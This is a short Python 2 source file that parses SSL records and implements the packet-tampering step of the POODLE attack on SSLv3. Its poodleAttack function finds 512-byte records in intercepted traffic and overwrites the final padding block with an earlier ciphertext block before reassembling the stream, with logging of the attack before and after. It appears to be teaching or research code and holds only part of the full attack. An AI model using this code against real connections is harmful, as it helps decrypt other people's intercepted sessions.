'''
Created on Apr 13, 2015

@author: kehan_wang
'''
class SSLPacket(object):
    def __init__(self, packet):
        self.type = packet[0]
        self.version = packet[1:3]
        self.length = ord(packet[3]) * 256 + ord(packet[4])
        self.data = packet[5:]
        if len(self.data)!=self.length:
            print "SSL packet error: length check failed"
    
def seperateSSL(data):
    rslt = []
    current = 0
    while current < len(data):
        pLength = ord(data[current + 3]) * 256 + ord(data[current + 4])
        newPacket = SSLPacket(data[current:current + pLength + 5])
        rslt.append(newPacket)
        current += 5+pLength
        #printSSL(newPacket)
    return rslt
    
def printSSL(spacket):
    print "Length:%d"%spacket.length,
    print ":".join("{:02x}".format(ord(c)) for c in spacket.data)
    
def printRawSSL(data):
    print ":".join("{:02x}".format(ord(c)) for c in data)
    
def poodleAttack(data):
    printlog = False
    attacked = False
    packets = seperateSSL(data)
    for p in packets:
        if p.length == 512:
            #printRawSSL(p.data)
            attacked= True
            strList = list(p.data)
            strList[496:512] = strList[448:464]
            p.data = "".join(strList)
    rslt = contancateSSLPackets(packets)
    if attacked:
        if printlog:
            print "#################ATTACK=====BEFORE###################"
            printRawSSL(data)
            print "#####################################################"
            print "***************ATTACK======AFTER*********************"
            printRawSSL(rslt)
            print "*****************************************************"
        return (rslt, True)
    return (data, False)


def contancateSSLPackets(packets):
    rslt = []
    for p in packets:
        rslt +=  p.type + p.version + chr(p.length//256) + chr(p.length % 256) + p.data
    return "".join(rslt)
        
def comparePackets(p1, p2):
    for (a,b) in zip(p1,p2):
        if a != b: return False
    return True

        